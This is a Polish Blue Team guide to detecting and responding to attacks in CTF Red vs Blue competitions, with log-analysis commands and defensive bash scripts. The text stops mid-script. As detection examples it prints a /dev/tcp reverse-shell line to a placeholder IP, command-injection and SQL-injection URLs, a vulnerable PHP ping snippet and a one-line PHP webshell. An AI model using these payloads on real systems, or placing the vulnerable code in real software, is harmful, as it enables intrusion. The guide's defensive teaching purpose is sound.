# Detekcja ataku i incident response w czasie rzeczywistym

(C) 2026 CyberPrzem

---

## 1. Cel materiału

Ten dokument jest praktycznym przewodnikiem dla uczestników zawodów typu **Red Team vs Blue Team**, ze szczególnym naciskiem na pracę Blue Teamu: detekcję ataku, analizę śladów, reakcję na incydent, utrzymanie usług oraz raportowanie.


---

## 2. Detekcja w zawodach Red vs Blue

W zawodach Red vs Blue detekcja nie polega wyłącznie na zauważeniu alertu. Blue Team musi umieć połączyć wiele sygnałów w logiczny obraz incydentu.

Przykładowy ciąg zdarzeń:

```text
1. W logach nginx pojawiają się liczne żądania do nieistniejących ścieżek.
2. Następnie pojawia się żądanie do /ping.php?host=127.0.0.1;id.
3. Proces php-fpm uruchamia proces /bin/sh.
4. Proces /bin/sh uruchamia /bin/bash.
5. Bash nawiązuje połączenie TCP do adresu IP atakującego.
6. W katalogu /var/www/html/uploads pojawia się nowy plik shell.php.
7. W cronie zostaje dodany wpis pobierający skrypt z zewnętrznego adresu.
```

Pojedyncze zdarzenie może być niejednoznaczne. Dopiero ich korelacja pokazuje, że doszło do kompromitacji.

### Najważniejsze pytania Blue Teamu

Po wykryciu podejrzanej aktywności zespół powinien odpowiedzieć na pytania:

1. Kiedy rozpoczął się atak?
2. Z jakiego adresu IP prowadzono działania?
3. Jaki był pierwszy wektor wejścia?
4. Czy atakujący uzyskał wykonanie kodu?
5. Czy atakujący uzyskał powłokę?
6. Czy doszło do eskalacji uprawnień?
7. Czy pozostawiono persistence?
8. Czy usługa punktowana nadal działa?
9. Jakie działania naprawcze wykonano?
10. Czy po naprawie atak nadal jest możliwy?

---

## 3. Cykl incident response

W uproszczonej wersji na potrzeby CTF cykl incident response obejmuje sześć etapów.

```text
Przygotowanie -> Identyfikacja -> Ograniczenie skutków -> Usunięcie przyczyny -> Przywrócenie działania -> Wnioski i raport
```

### 3.1. Przygotowanie

Przed rozpoczęciem rundy Blue Team powinien:

- sprawdzić aktywne usługi,
- sprawdzić otwarte porty,
- uruchomić podgląd logów,
- wykonać kopię konfiguracji,
- sprawdzić użytkowników i grupy uprzywilejowane,
- sprawdzić SSH,
- zweryfikować monitoring dostępności,
- przygotować plik do notatek i timeline.

Przykładowe komendy startowe:

```bash
hostnamectl
ip a
ss -tulpen
systemctl --type=service --state=running
who
w
last -n 10
```

### 3.2. Identyfikacja

Identyfikacja polega na potwierdzeniu, czy podejrzane zdarzenie jest faktycznym incydentem.

Przykładowe sygnały:

- wiele nieudanych logowań SSH,
- wejście na nietypowy endpoint aplikacji webowej,
- nowy plik w katalogu webowym,
- proces bash uruchomiony przez użytkownika `www-data`,
- połączenie wychodzące do nietypowego IP,
- nowy wpis w cronie,
- nowa usługa systemd,
- zmiana w `authorized_keys`.

### 3.3. Ograniczenie skutków

Celem jest zatrzymanie aktywnego ataku bez niepotrzebnego niszczenia dowodów i bez wyłączenia usługi punktowanej.

Przykłady:

```bash
# Zablokowanie adresu IP
sudo ufw deny from 192.0.2.50

# Zakończenie podejrzanego procesu
sudo kill -9 PID

# Zablokowanie konta
sudo passwd -l nazwa_uzytkownika

# Zakończenie sesji użytkownika
sudo pkill -u nazwa_uzytkownika
```

### 3.4. Usunięcie przyczyny

Po ograniczeniu aktywnego dostępu należy usunąć pierwotną przyczynę incydentu.

Przykłady:

- usunięcie webshella,
- poprawa błędnych uprawnień katalogu,
- wyłączenie wykonywania PHP w katalogu upload,
- usunięcie wpisu cron,
- usunięcie klucza SSH atakującego,
- poprawa konfiguracji `sudoers`,
- wyłączenie logowania SSH hasłem,
- ograniczenie dostępu do panelu administracyjnego.

### 3.5. Przywrócenie działania

Po zmianach należy sprawdzić, czy usługa nadal działa.

```bash
systemctl status nginx
systemctl status apache2
curl -I http://127.0.0.1
ss -tulpen
journalctl -u nginx --no-pager -n 50
journalctl -u apache2 --no-pager -n 50
```

### 3.6. Wnioski i raport

Każdy incydent powinien zakończyć się krótkim raportem. W zawodach raport powinien być zwięzły, oparty na dowodach i możliwy do szybkiego odczytania.

Szablon:

```text
Raport incydentu - Blue Team

Data i czas wykrycia:
Źródło wykrycia:
Adres IP atakującego:
Dotknięta usługa:
Wektor wejścia:
Opis zdarzenia:
Dowody:
Podjęte działania:
Czy wykryto persistence:
Status końcowy:
Rekomendacje:
```

---

## 4. Źródła danych dla Blue Teamu

### 4.1. Logi systemowe

Najważniejsze pliki i komendy:

```bash
/var/log/auth.log
/var/log/syslog
/var/log/kern.log
journalctl
journalctl -xe
journalctl --since "10 minutes ago"
```

W `auth.log` znajdziemy między innymi:

- próby logowania SSH,
- udane logowania,
- użycie `sudo`,
- otwieranie i zamykanie sesji użytkowników.

Przykłady:

```bash
sudo grep "Failed password" /var/log/auth.log
sudo grep "Invalid user" /var/log/auth.log
sudo grep "Accepted" /var/log/auth.log
sudo grep "sudo:" /var/log/auth.log
```

### 4.2. Logi nginx

Typowe lokalizacje:

```bash
/var/log/nginx/access.log
/var/log/nginx/error.log
```

Podgląd na żywo:

```bash
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/nginx/error.log
```

Szybkie wyszukiwanie podejrzanych żądań:

```bash
sudo grep -Ei "cmd=|select|union|passwd|shell|\.env|\.git|base64|/tmp|wget|curl" /var/log/nginx/access.log
```

### 4.3. Logi Apache

Typowe lokalizacje:

```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
```

Podgląd na żywo:

```bash
sudo tail -f /var/log/apache2/access.log
sudo tail -f /var/log/apache2/error.log
```

Szybkie wyszukiwanie podejrzanych żądań:

```bash
sudo grep -Ei "cmd=|select|union|passwd|shell|\.env|\.git|base64|/tmp|wget|curl" /var/log/apache2/access.log
```

### 4.4. Procesy

```bash
ps auxf
pstree -ap
top
htop
```

Szczególnie podejrzane są procesy:

- `bash`, `sh`, `dash` uruchomione przez `www-data`, `apache`, `nginx`,
- `nc`, `ncat`, `socat`,
- `python -c`, `perl -e`, `php -r`,
- pliki wykonywalne uruchomione z `/tmp`, `/var/tmp`, `/dev/shm`.

### 4.5. Połączenia sieciowe

```bash
ss -tunap
sudo lsof -i -n -P
sudo tcpdump -i any
```

Przykładowe pytania:

- Czy serwer ma nietypowe połączenia wychodzące?
- Jaki proces odpowiada za połączenie?
- Jaki użytkownik uruchomił proces?
- Czy port docelowy wygląda podejrzanie?

---

## 5. Detekcja rekonesansu

Red Team zwykle zaczyna od rekonesansu. Może to obejmować:

- skanowanie portów,
- rozpoznawanie wersji usług,
- enumerację katalogów webowych,
- wyszukiwanie paneli administracyjnych,
- sprawdzanie plików `.env`, `.git`, kopii zapasowych i endpointów testowych.

### 5.1. Objawy w logach webowych

Przykładowe wpisy:

```text
GET /admin HTTP/1.1
GET /login HTTP/1.1
GET /.env HTTP/1.1
GET /.git/config HTTP/1.1
GET /backup.zip HTTP/1.1
GET /phpinfo.php HTTP/1.1
GET /server-status HTTP/1.1
GET /uploads/ HTTP/1.1
```

### 5.2. Komendy detekcyjne

Dla nginx:

```bash
sudo awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head
sudo grep -E " 404 " /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head
sudo grep -Ei "\.env|\.git|backup|admin|phpinfo|server-status|uploads" /var/log/nginx/access.log
```

Dla Apache:

```bash
sudo awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head
sudo grep -E " 404 " /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head
sudo grep -Ei "\.env|\.git|backup|admin|phpinfo|server-status|uploads" /var/log/apache2/access.log
```

### 5.3. Przykład interpretacji

Jeżeli jeden adres IP generuje setki odpowiedzi 404 w krótkim czasie i odpytuje ścieżki typu `.env`, `.git/config`, `/admin`, `/backup.zip`, prawdopodobnie trwa enumeracja aplikacji webowej.

Samo skanowanie nie musi oznaczać kompromitacji, ale powinno zostać odnotowane w timeline.

---

## 6. Detekcja brute force SSH

### 6.1. Objawy

Typowe wpisy w `/var/log/auth.log`:

```text
Failed password for invalid user admin from 192.0.2.50 port 51234 ssh2
Failed password for root from 192.0.2.50 port 51235 ssh2
Accepted password for student from 192.0.2.50 port 51240 ssh2
```

Najbardziej niebezpieczny wzorzec:

```text
Wiele wpisów Failed password -> jeden wpis Accepted password
```

### 6.2. Komendy

```bash
sudo grep "Failed password" /var/log/auth.log
sudo grep "Invalid user" /var/log/auth.log
sudo grep "Accepted" /var/log/auth.log
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head
```

Uwaga: pozycja pola z adresem IP może różnić się zależnie od dystrybucji i formatu logu. W skryptach lepiej używać wyrażeń regularnych.

### 6.3. Reakcja

```bash
# Zablokowanie IP
sudo ufw deny from 192.0.2.50

# Zablokowanie przejętego konta
sudo passwd -l student

# Zakończenie aktywnych sesji użytkownika
sudo pkill -u student

# Sprawdzenie ostatnich logowań
last -a | head -30
```

### 6.4. Hardening SSH

Plik:

```bash
sudo nano /etc/ssh/sshd_config
```

Ustawienia:

```text
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
AllowUsers wybrany_uzytkownik
```

Restart:

```bash
sudo systemctl restart ssh
```

Uwaga praktyczna: przed restartem SSH warto mieć otwartą drugą sesję administracyjną, żeby nie odciąć sobie dostępu.

---

## 7. Detekcja ataków webowych

### 7.1. Podejrzane wzorce w URL

```text
?id=1' OR '1'='1
?id=1 UNION SELECT
?cmd=id
?cmd=whoami
?page=../../../../etc/passwd
?file=/etc/passwd
/uploads/shell.php
/.git/config
/.env
```

### 7.2. Wyszukiwanie wzorców

nginx:

```bash
sudo grep -Ei "cmd=|whoami|/etc/passwd|\.env|\.git|union|select|base64|shell|wget|curl" /var/log/nginx/access.log
```

Apache:

```bash
sudo grep -Ei "cmd=|whoami|/etc/passwd|\.env|\.git|union|select|base64|shell|wget|curl" /var/log/apache2/access.log
```

### 7.3. Interpretacja

Przykład:

```text
GET /ping.php?host=127.0.0.1;id HTTP/1.1
GET /ping.php?host=127.0.0.1;whoami HTTP/1.1
GET /ping.php?host=127.0.0.1;bash+-c+... HTTP/1.1
```

Taki ciąg wskazuje na możliwe command injection. Jeżeli chwilę później pojawia się proces `bash` uruchomiony przez `www-data`, incydent należy traktować jako potwierdzony.

---

## 8. Detekcja command injection

Command injection występuje wtedy, gdy aplikacja przekazuje dane od użytkownika do polecenia systemowego bez poprawnej walidacji.

Przykładowy podatny fragment PHP:

```php
<?php
$host = $_GET['host'];
system("ping -c 1 " . $host);
?>
```

Atakujący może wywołać:

```text
/ping.php?host=127.0.0.1;id
```

### 8.1. Objawy po stronie systemu

```bash
ps auxf
pstree -ap
sudo lsof -i -n -P
ss -tunap
```

Podejrzany łańcuch:

```text
nginx/apache
 └── php-fpm
      └── sh
           └── bash
```

### 8.2. Reakcja

- zablokować aktywne połączenie,
- zakończyć podejrzany proces,
- sprawdzić, czy atakujący utworzył pliki,
- poprawić walidację parametru,
- ograniczyć uprawnienia użytkownika aplikacyjnego,
- rozważyć wyłączenie niebezpiecznych funkcji PHP.

W PHP można ograniczyć niektóre funkcje przez `php.ini`:

```text
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

Nie jest to pełne zabezpieczenie, ale może ograniczyć skutki prostych ataków.

---

## 9. Detekcja reverse shell

Reverse shell polega na tym, że maszyna ofiary nawiązuje połączenie wychodzące do atakującego.

### 9.1. Objawy

- proces `bash`, `sh`, `python`, `perl`, `php`, `nc`, `socat`,
- proces działa jako `www-data`, `apache` lub inny użytkownik usługi,
- połączenie wychodzące do nietypowego adresu IP,
- porty typu `4444`, `1337`, `9001`, `8081`, choć port może być dowolny.

### 9.2. Komendy

```bash
ss -tunap
sudo lsof -i -n -P
ps auxf
pstree -ap
```

Przykład podejrzanego wpisu:

```text
www-data  bash -c bash -i >& /dev/tcp/192.0.2.50/4444 0>&1
```

### 9.3. Reakcja

Przed zabiciem procesu warto zapisać dowody:

```bash
date
ps auxf | grep -E "bash|sh|nc|socat|python|perl|php"
ss -tunap
sudo lsof -i -n -P
```

Następnie:

```bash
sudo kill -9 PID
sudo ufw deny from 192.0.2.50
```

Po zakończeniu procesu koniecznie należy sprawdzić persistence.

---

## 10. Detekcja webshella

Webshell to plik umieszczony w katalogu aplikacji webowej, który pozwala wykonywać polecenia przez HTTP.

### 10.1. Typowe lokalizacje

```text
/var/www/html/
/var/www/html/uploads/
/usr/share/nginx/html/
/srv/www/
```

### 10.2. Komendy detekcyjne

```bash
sudo find /var/www -type f -mtime -1 -ls
sudo find /var/www -type f -name "*.php" -exec grep -Ei "system|shell_exec|passthru|exec|eval|assert|base64_decode" {} \;
sudo grep -R "base64_decode" /var/www
sudo grep -R "shell_exec" /var/www
```

### 10.3. Przykład prostego webshella

```php
<?php system($_GET['cmd']); ?>
```

Uwaga: taki przykład powinien być używany wyłącznie w kontrolowanym laboratorium edukacyjnym.

### 10.4. Reakcja

```bash
# Zabezpieczenie dowodu
sudo cp /var/www/html/uploads/shell.php /root/evidence_shell.php

# Usunięcie webshella
sudo rm /var/www/html/uploads/shell.php

# Poprawa uprawnień
sudo chown -R root:www-data /var/www/html
sudo find /var/www/html -type d -exec chmod 750 {} \;
sudo find /var/www/html -type f -exec chmod 640 {} \;
```

Jeżeli aplikacja wymaga zapisu do katalogu upload, należy uniemożliwić wykonywanie skryptów w tym katalogu.

Przykład dla nginx:

```nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```

---

## 11. Detekcja persistence

Persistence to mechanizm utrzymania dostępu po restarcie, usunięciu webshella lub zakończeniu sesji.

### 11.1. Najczęstsze miejsca persistence

```text
~/.ssh/authorized_keys
/etc/passwd
/etc/sudoers
/etc/sudoers.d/
/etc/crontab
/etc/cron.d/
/var/spool/cron/
/etc/systemd/system/
~/.bashrc
~/.profile
/tmp
/dev/shm
```

### 11.2. Klucze SSH

```bash
sudo find /home /root -name authorized_keys -exec ls -la {} \;
sudo find /home /root -name authorized_keys -exec cat {} \;
```

### 11.3. Cron

```bash
sudo crontab -l
sudo ls -la /etc/cron.*
sudo cat /etc/crontab
sudo grep -R "bash\|nc\|curl\|wget\|python\|perl" /etc/cron* /var/spool/cron 2>/dev/null
```

### 11.4. Systemd

```bash
sudo find /etc/systemd/system -type f -mtime -2 -ls
sudo systemctl list-unit-files --type=service
sudo grep -R "bash\|nc\|curl\|wget\|python\|perl" /etc/systemd/system 2>/dev/null
```

### 11.5. Pliki startowe użytkownika

```bash
sudo grep -R "bash\|nc\|curl\|wget\|python\|perl" /home/*/.bashrc /home/*/.profile /root/.bashrc /root/.profile 2>/dev/null
```

---

## 12. Kontrola użytkowników i uprawnień

### 12.1. Użytkownicy

```bash
cat /etc/passwd
awk -F: '$3 >= 1000 {print}' /etc/passwd
sudo awk -F: '$3 == 0 {print}' /etc/passwd
```

Użytkownik z UID 0 inny niż root jest krytycznym problemem.

### 12.2. Grupy uprzywilejowane

```bash
getent group sudo
getent group adm
getent group docker
getent group lxd
```

Członkostwo w grupach `docker` lub `lxd` może prowadzić do eskalacji uprawnień.

### 12.3. Sudoers

```bash
sudo grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
sudo visudo -c
```

Wpis `NOPASSWD` nie zawsze jest błędem, ale w CTF bardzo często jest celowym wektorem eskalacji.

---

## 13. Timeline incydentu

Timeline powinien być tworzony na bieżąco. Nie należy czekać do końca rundy, bo część informacji może zostać utracona.

Przykładowy format:

| Czas | Zdarzenie | Źródło | Komentarz |
|---|---|---|---|
| 10:12:03 | Skanowanie `/admin`, `/.env`, `/uploads` | nginx access.log | IP 192.0.2.50 |
| 10:14:21 | Próba command injection `?cmd=id` | nginx access.log | Endpoint `/ping.php` |
| 10:15:02 | Proces `bash` jako `www-data` | `ps auxf` | Podejrzenie reverse shell |
| 10:15:06 | Połączenie do `192.0.2.50:4444` | `ss -tunap` | Incydent potwierdzony |
| 10:16:30 | Dodano wpis w cronie | `/etc/crontab` | Persistence |
| 10:20:00 | Usunięto webshell i zablokowano IP | działania Blue Team | Usługa działa |

---

## 14. Minimalna checklista Blue Teamu

### 14.1. Start rundy

```text
[ ] Sprawdź aktywne usługi.
[ ] Sprawdź otwarte porty.
[ ] Sprawdź użytkowników i grupy uprzywilejowane.
[ ] Sprawdź SSH.
[ ] Sprawdź katalog webowy.
[ ] Uruchom podgląd logów.
[ ] Sprawdź monitoring dostępności.
[ ] Zrób kopię konfiguracji.
[ ] Załóż plik timeline.
```

### 14.2. W trakcie ataku

```text
[ ] Monitoruj auth.log.
[ ] Monitoruj access.log i error.log.
[ ] Sprawdzaj procesy.
[ ] Sprawdzaj połączenia sieciowe.
[ ] Szukaj nowych plików w katalogach web.
[ ] Szukaj persistence.
[ ] Notuj czas i źródło zdarzeń.
[ ] Nie wyłączaj usługi punktowanej bez potrzeby.
```

### 14.3. Po incydencie

```text
[ ] Usuń aktywny dostęp.
[ ] Usuń persistence.
[ ] Zamknij podatność.
[ ] Sprawdź, czy usługa działa.
[ ] Sprawdź, czy monitoring pokazuje status UP.
[ ] Przygotuj raport.
[ ] Zapisz rekomendacje.
```

---

# 15. Skrypty przydatne na CTF

Poniższe skrypty są przeznaczone do działań defensywnych i edukacyjnych w kontrolowanym środowisku CTF. Przed użyciem w realnym systemie należy je przejrzeć i dostosować do środowiska.

Zalecana struktura katalogu:

```bash
mkdir -p ~/ctf-blue/scripts ~/ctf-blue/reports ~/ctf-blue/evidence
cd ~/ctf-blue/scripts
```

---

## 15.1. Skrypt: szybki snapshot systemu

Nazwa pliku: `snapshot.sh`

Zastosowanie:

- wykonuje szybki zrzut stanu systemu,
- zapisuje procesy, porty, użytkowników, usługi, połączenia i logowania,
- przydatny na początku rundy i po wykryciu incydentu.

```bash
#!/usr/bin/env bash
set -euo pipefail

OUT_DIR="${1:-$HOME/ctf-blue/evidence}"
TS="$(date +%Y%m%d_%H%M%S)"
HOST="$(hostname)"
DIR="$OUT_DIR/snapshot_${HOST}_${TS}"

mkdir -p "$DIR"

{
  echo "# Snapshot"
  echo "Host: $HOST"
  echo "Time: $(date -Is)"
  echo "User: $(whoami)"
} > "$DIR/README.txt"

hostnamectl > "$DIR/hostnamectl.txt" 2>&1 || true
ip a > "$DIR/ip_a.txt" 2>&1 || true
ip route > "$DIR/ip_route.txt" 2>&1 || true
ss -tulpen > "$DIR/ss_tulpen.txt" 2>&1 || true
ss -tunap > "$DIR/ss_tunap.txt" 2>&1 || true
ps auxf > "$DIR/ps_auxf.txt" 2>&1 || true
pstree -ap > "$DIR/pstree.txt" 2>&1 || true
systemctl --type=service --state=running > "$DIR/running_services.txt" 2>&1 || true
who > "$DIR/who.txt" 2>&1 || true
w > "$DIR/w.txt" 2>&1 || true
last -a | head -100 > "$DIR/last.txt" 2>&1 || true
lastb -a | head -100 > "$DIR/lastb.txt" 2>&1 || true
cat /etc/passwd > "$DIR/passwd.txt" 2>&1 || true
getent group sudo > "$DIR/group_sudo.txt" 2>&1 || true
getent group docker > "$DIR/group_docker.txt" 2>&1 || true
sudo grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d/ > "$DIR/sudoers_nopasswd.txt" 2>&1 || true

if [ -f /var/log/auth.log ]; then
  sudo tail -300 /var/log/auth.log > "$DIR/auth_tail.txt" 2>&1 || true
fi

if [ -f /var/log/nginx/access.log ]; then
  sudo tail -300 /var/log/nginx/access.log > "$DIR/nginx_access_tail.txt" 2>&1 || true
fi

if [ -f /var/log/apache2/access.log ]; then
  sudo tail -300 /var/log/apache2/access.log > "$DIR/apache_access_tail.txt" 2>&1 || true
fi

tar -czf "$DIR.tar.gz" -C "$OUT_DIR" "$(basename "$DIR")"
echo "Snapshot zapisany w: $DIR.tar.gz"
```

Uruchomienie:

```bash
chmod +x snapshot.sh
./snapshot.sh
```

---

## 15.2. Skrypt: watcher logów SSH

Nazwa pliku: `watch_ssh.sh`

Zastosowanie:

- pokazuje na żywo nieudane i udane logowania SSH,
- pomocny podczas rundy Blue Team.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOG="/var/log/auth.log"

if [ ! -f "$LOG" ]; then
  echo "Brak pliku $LOG"
  exit 1
fi

echo "Monitorowanie SSH: $LOG"
echo "Przerwij przez Ctrl+C"

sudo tail -F "$LOG" | grep --line-buffered -Ei "Failed password|Invalid user|Accepted password|Accepted publickey|session opened|session closed|sudo:"
```

Uruchomienie:

```bash
chmod +x watch_ssh.sh
./watch_ssh.sh
```

---

## 15.3. Skrypt: podsumowanie brute force SSH

Nazwa pliku: `ssh_bruteforce_summary.sh`

Zastosowanie:

- zlicza adresy IP generujące nieudane logowania,
- pokazuje udane logowania,
- pomaga szybko ustalić, czy brute force zakończył się sukcesem.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOG="${1:-/var/log/auth.log}"

if [ ! -f "$LOG" ]; then
  echo "Brak pliku: $LOG"
  exit 1
fi

echo "== Top IP - Failed password =="
sudo grep "Failed password" "$LOG" \
  | grep -Eo 'from ([0-9]{1,3}\.){3}[0-9]{1,3}' \
  | awk '{print $2}' \
  | sort | uniq -c | sort -nr | head -20 || true

echo

echo "== Invalid users =="
sudo grep "Invalid user" "$LOG" \
  | sed -E 's/.*Invalid user ([^ ]+) from ([0-9.]+).*/user=\1 ip=\2/' \
  | sort | uniq -c | sort -nr | head -20 || true

echo

echo "== Accepted logins =="
sudo grep -E "Accepted password|Accepted publickey" "$LOG" || true
```

Uruchomienie:

```bash
chmod +x ssh_bruteforce_summary.sh
./ssh_bruteforce_summary.sh
```

---

## 15.4. Skrypt: watcher logów webowych

Nazwa pliku: `watch_web.sh`

Zastosowanie:

- monitoruje logi Apache i nginx,
- wyróżnia podejrzane wzorce w żądaniach HTTP.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOGS=()

[ -f /var/log/nginx/access.log ] && LOGS+=(/var/log/nginx/access.log)
[ -f /var/log/apache2/access.log ] && LOGS+=(/var/log/apache2/access.log)

if [ "${#LOGS[@]}" -eq 0 ]; then
  echo "Nie znaleziono logów nginx/apache."
  exit 1
fi

echo "Monitorowane logi: ${LOGS[*]}"
echo "Przerwij przez Ctrl+C"

sudo tail -F "${LOGS[@]}" | grep --line-buffered -Ei "cmd=|whoami|/etc/passwd|\.env|\.git|union|select|base64|shell|wget|curl|/tmp|/dev/shm|\.php"
```

Uruchomienie:

```bash
chmod +x watch_web.sh
./watch_web.sh
```

---

## 15.5. Skrypt: podsumowanie rekonesansu webowego

Nazwa pliku: `web_recon_summary.sh`

Zastosowanie:

- pokazuje najaktywniejsze adresy IP,
- pokazuje najczęstsze kody odpowiedzi,
- pokazuje najczęściej odpytywane ścieżki,
- pomaga wykryć fuzzing i enumerację.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOG="${1:-}"

if [ -z "$LOG" ]; then
  if [ -f /var/log/nginx/access.log ]; then
    LOG="/var/log/nginx/access.log"
  elif [ -f /var/log/apache2/access.log ]; then
    LOG="/var/log/apache2/access.log"
  else
    echo "Podaj plik logu jako argument."
    exit 1
  fi
fi

if [ ! -f "$LOG" ]; then
  echo "Brak pliku: $LOG"
  exit 1
fi

echo "Analizowany log: $LOG"

echo

echo "== Top IP =="
awk '{print $1}' "$LOG" | sort | uniq -c | sort -nr | head -20

echo

echo "== Top status codes =="
awk '{print $9}' "$LOG" | sort | uniq -c | sort -nr | head -20

echo

echo "== Top requested paths =="
awk '{print $7}' "$LOG" | sort | uniq -c | sort -nr | head -30

echo

echo "== Top IP generating 404 =="
awk '$9 == 404 {print $1}' "$LOG" | sort | uniq -c | sort -nr | head -20

echo

echo "== Suspicious requests =="
grep -Ei "\.env|\.git|backup|admin|phpinfo|server-status|cmd=|passwd|union|select|base64|shell|wget|curl" "$LOG" | tail -50 || true
```

Uruchomienie:

```bash
chmod +x web_recon_summary.sh
./web_recon_summary.sh
```

---

## 15.6. Skrypt: wykrywanie podejrzanych procesów

Nazwa pliku: `suspicious_processes.sh`

Zastosowanie:

- wyszukuje procesy często używane przy reverse shellach i command injection,
- pokazuje procesy uruchomione z katalogów tymczasowych,
- nie zabija procesów automatycznie.

```bash
#!/usr/bin/env bash
set -euo pipefail

echo "== Podejrzane procesy według nazwy =="
ps auxww | grep -Ei "bash -i|/dev/tcp|nc |ncat|socat|python -c|perl -e|php -r|wget |curl " | grep -v grep || true

echo

echo "== Procesy użytkowników webowych =="
ps auxww | awk '$1 ~ /www-data|apache|nginx/ {print}' || true

echo

echo "== Procesy uruchomione z /tmp, /var/tmp, /dev/shm =="
ps auxww | grep -E "/tmp|/var/tmp|/dev/shm" | grep -v grep || true

echo

echo "== Drzewo procesów =="
pstree -ap | grep -Ei "www-data|apache|nginx|bash|sh|nc|socat|python|perl|php" || true
```

Uruchomienie:

```bash
chmod +x suspicious_processes.sh
./suspicious_processes.sh
```

---

## 15.7. Skrypt: wykrywanie podejrzanych połączeń sieciowych

Nazwa pliku: `suspicious_connections.sh`

Zastosowanie:

- pokazuje połączenia aktywne,
- wyróżnia nietypowe porty często używane w CTF,
- pomaga znaleźć reverse shell.

```bash
#!/usr/bin/env bash
set -euo pipefail

echo "== Wszystkie połączenia TCP/UDP z procesami =="
sudo ss -tunap

echo

echo "== Podejrzane porty CTF =="
sudo ss -tunap | grep -E ":(4444|1337|31337|9001|8081|5555|6666)" || true

echo

echo "== Procesy z połączeniami sieciowymi =="
sudo lsof -i -n -P | grep -Ei "bash|sh|nc|ncat|socat|python|perl|php|www-data|apache|nginx" || true
```

Uruchomienie:

```bash
chmod +x suspicious_connections.sh
./suspicious_connections.sh
```

---

## 15.8. Skrypt: wyszukiwanie webshelli

Nazwa pliku: `find_webshells.sh`

Zastosowanie:

- wyszukuje świeże pliki w katalogach webowych,
- wykrywa podejrzane funkcje PHP,
- tworzy kopię podejrzanych wyników tekstowych do raportu.

```bash
#!/usr/bin/env bash
set -euo pipefail

WEB_ROOT="${1:-/var/www}"
OUT_DIR="${2:-$HOME/ctf-blue/evidence}"
TS="$(date +%Y%m%d_%H%M%S)"
OUT="$OUT_DIR/webshell_scan_$TS.txt"

mkdir -p "$OUT_DIR"

{
  echo "# Webshell scan"
  echo "Time: $(date -Is)"
  echo "WEB_ROOT: $WEB_ROOT"
  echo

  echo "== Pliki zmodyfikowane w ostatnich 24h =="
  sudo find "$WEB_ROOT" -type f -mtime -1 -ls 2>/dev/null || true
  echo

  echo "== Podejrzane funkcje PHP =="
  sudo find "$WEB_ROOT" -type f -name "*.php" -exec grep -HnEi "system\(|shell_exec\(|passthru\(|exec\(|eval\(|assert\(|base64_decode\(|gzinflate\(" {} \; 2>/dev/null || true
  echo

  echo "== Nietypowe rozszerzenia w katalogu web =="
  sudo find "$WEB_ROOT" -type f \( -name "*.sh" -o -name "*.py" -o -name "*.pl" -o -name "*.bin" -o -name "*.elf" \) -ls 2>/dev/null || true
} | tee "$OUT"

echo "Wynik zapisany w: $OUT"
```

Uruchomienie:

```bash
chmod +x find_webshells.sh
./find_webshells.sh /var/www
```

---

## 15.9. Skrypt: sprawdzanie persistence

Nazwa pliku: `check_persistence.sh`

Zastosowanie:

- sprawdza klucze SSH, cron, systemd, pliki startowe i podejrzane wpisy,
- nie usuwa niczego automatycznie.

```bash
#!/usr/bin/env bash
set -euo pipefail

OUT_DIR="${1:-$HOME/ctf-blue/evidence}"
TS="$(date +%Y%m%d_%H%M%S)"
OUT="$OUT_DIR/persistence_check_$TS.txt"

mkdir -p "$OUT_DIR"

{
  echo "# Persistence check"
  echo "Time: $(date -Is)"
  echo

  echo "== authorized_keys =="
  sudo find /home /root -name authorized_keys -exec ls -la {} \; -exec cat {} \; 2>/dev/null || true
  echo

  echo "== /etc/crontab =="
  sudo cat /etc/crontab 2>/dev/null || true
  echo

  echo "== /etc/cron* suspicious =="
  sudo grep -R "bash\|nc\|ncat\|socat\|curl\|wget\|python\|perl\|php" /etc/cron* /var/spool/cron 2>/dev/null || true
  echo

  echo "== Recently modified systemd units =="
  sudo find /etc/systemd/system -type f -mtime -7 -ls 2>/dev/null || true
  echo

  echo "== Suspicious systemd content =="
  sudo grep -R "bash\|nc\|ncat\|socat\|curl\|wget\|python\|perl\|php" /etc/systemd/system 2>/dev/null || true
  echo

  echo "== Shell startup files suspicious =="
  sudo grep -R "bash\|nc\|ncat\|socat\|curl\|wget\|python\|perl\|php" /home/*/.bashrc /home/*/.profile /root/.bashrc /root/.profile 2>/dev/null || true
  echo

  echo "== Recently modified files in /tmp /var/tmp /dev/shm =="
  sudo find /tmp /var/tmp /dev/shm -type f -mtime -1 -ls 2>/dev/null || true
} | tee "$OUT"

echo "Wynik zapisany w: $OUT"
```

Uruchomienie:

```bash
chmod +x check_persistence.sh
./check_persistence.sh
```

---

## 15.10. Skrypt: szybki audyt użytkowników

Nazwa pliku: `audit_users.sh`

Zastosowanie:

- wykrywa użytkowników z UID 0,
- pokazuje grupy uprzywilejowane,
- pokazuje wpisy `NOPASSWD`,
- pokazuje ostatnie logowania.

```bash
#!/usr/bin/env bash
set -euo pipefail

echo "== Użytkownicy z UID 0 =="
sudo awk -F: '$3 == 0 {print}' /etc/passwd

echo

echo "== Użytkownicy >= UID 1000 =="
awk -F: '$3 >= 1000 && $3 < 65534 {print}' /etc/passwd

echo

echo "== Grupa sudo =="
getent group sudo || true

echo

echo "== Grupa adm =="
getent group adm || true

echo

echo "== Grupa docker =="
getent group docker || true

echo

echo "== Grupa lxd =="
getent group lxd || true

echo

echo "== Wpisy NOPASSWD =="
sudo grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null || true

echo

echo "== Ostatnie logowania =="
last -a | head -30 || true

echo

echo "== Konta bez hasła lub zablokowane - passwd status =="
while IFS=: read -r user _ uid _; do
